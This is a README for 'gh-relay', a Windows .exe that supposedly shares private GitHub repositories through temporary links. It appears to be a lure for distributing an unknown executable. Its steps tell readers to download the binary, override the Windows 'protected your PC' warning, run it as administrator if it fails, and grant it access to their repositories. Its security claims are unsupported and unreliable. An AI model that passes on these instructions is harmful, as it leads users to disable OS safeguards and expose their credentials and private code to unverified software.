# 🔗 gh-relay - Share private code with anyone easily

[![](https://img.shields.io/badge/Download-gh--relay-blue.svg)](https://github.com/Unified-rosinbag197/gh-relay/releases)

gh-relay allows you to share private GitHub repositories with other people. You do not need to add them as collaborators. You do not need to pay for extra seats. You do not need to clean up access permissions later. This tool manages the connection for you.

## 📥 How to download the software

You need to obtain the installation file from the official releases page. 

[Click here to visit the download page](https://github.com/Unified-rosinbag197/gh-relay/releases)

Once you arrive at the page:

1. Look for the section labeled "Assets" under the most recent version.
2. Find the file ending in `.exe`.
3. Click the filename to start your download.
4. Save the file to your desktop or your downloads folder.

## ⚙️ System requirements

gh-relay works on most modern Windows computers. Ensure your system meets these standards:

* Operating System: Windows 10 or Windows 11.
* Memory: 4GB of RAM or more.
* Storage: 100MB of free disk space.
* Internet: An active connection to reach GitHub servers.

If your computer uses an older version of Windows, the application might fail to open. You may need to update your system through the Windows Update settings menu before you continue.

## 🚀 Setting up the application

Follow these steps to run the software on your machine:

1. Locate the `.exe` file you downloaded earlier.
2. Double-click the file. 
3. If a window appears labeled "Windows protected your PC," click "More info" and then click the "Run anyway" button. This happens because the application is new and Windows does not recognize the publisher yet.
4. The application window will open on your screen.

## 🔑 Linking your GitHub account

The software requires permission to access your repositories. You only need to do this once.

1. Open the application.
2. Click the button labeled "Connect to GitHub."
3. Your web browser will open a page asking you to sign in.
4. Enter your GitHub username and password.
5. Grant the application permission to read your repositories.
6. Return to the application window. You will see a success message.

## 📤 Sharing a private repository

You can share a repository in seconds after you link your account.

1. Select the name of the private repository from the provided list.
2. Click the "Generate Share Link" button.
3. The software creates a unique, temporary URL.
4. Copy this link and send it to your contact through email or chat.

When your contact clicks the link, they view the code inside their browser. They do not need a GitHub account to see the files. They cannot edit your original code. You maintain full control over the connection at all times.

## 🛑 Ending a share session

You control how long the link stays active.

1. Open the gh-relay application window.
2. Look at the list of "Active Shares."
3. Find the link you want to turn off.
4. Click the "Stop Sharing" button next to that link.
5. Ask your contact to refresh their browser. They will no longer see your code.

## 🛡️ Privacy and security

Your code stays safe with gh-relay. The application acts as a secure bridge between your private repository and your visitor. It does not store your code on any third-party server. It creates a temporary window for your guest to view the contents of the repository.

Once you click "Stop Sharing," the bridge collapses. Your guest loses all access immediately. You do not need to worry about removing people from your repository settings later. The software handles all access management automatically.

## 🛠️ Troubleshooting common issues

Most users experience smooth operation with gh-relay. If you encounter errors, check these common fixes:

* The application fails to launch: Close all open programs and try to run the file as an administrator by right-clicking the icon and selecting that option.
* The link does not work for the guest: Ensure your internet connection is active. Sometimes, strict corporate network filters block access. Ask your guest to try a mobile data connection or a different network.
* The repository list is empty: Log out of the application and log back in. Ensure your GitHub account status is active and that you have ownership rights to the repositories you intend to share.
* The application window is frozen: Close the program entirely and reopen it. If the issue persists, delete the `.exe` file and download a fresh copy from the GitHub release page.

## 💡 Frequently asked questions

Do you store my password?
No. Your password stays with GitHub. We only receive a secure token that allows us to list your repositories.

Can my guest download my code?
Yes, usually users can download a zip file of the code through the browser viewer. This functionality mirrors standard GitHub behavior. You should only share with users you trust.

Does this work on Mac or Linux?
Currently, gh-relay is built specifically for Windows.

Can I share with more than one person?
Yes. You can send the same link to multiple people. Use the "Stop Sharing" button to revoke access for everyone simultaneously.

How many repositories can I share?
You can share as many as you need. The application does not limit your activity.
